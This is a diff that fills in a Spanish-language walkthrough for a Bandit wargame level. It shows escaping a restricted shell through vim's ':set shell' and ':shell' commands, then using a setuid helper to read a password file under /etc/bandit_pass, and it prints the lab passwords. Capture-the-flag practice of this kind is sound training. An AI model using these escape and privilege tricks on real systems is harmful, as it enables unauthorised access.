@@ -8,50 +8,31 @@ deberemos explorar el sistema de archivos o el entorno del usuario `bandit26` pa
 - **contraseña:** s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
 
 ## Solución
-```bash
 
-```
 ```text
-
-```
-```bash
-
-```
-```text
-
-```
-```bash
-
-```
-```text
-
+v
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+:set shell=/bin/bash
+:shell
 ```
 ```bash
-
+ls
 ```
 ```text
-
+bandit27-do text.txt
 ```
 ```bash
-
+./bandit27-do cat /etc/bandit_pass/bandit27
 ```
 ```text
-
-```
-```bash
-
-```
-```text
-
-```
-```bash
-
-```
-```text
-
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
 ```
 
 ## Notas Adicionales
-
+Se necesita reducir el tamaño la terminal para que funcione.
 
 ## Referencias
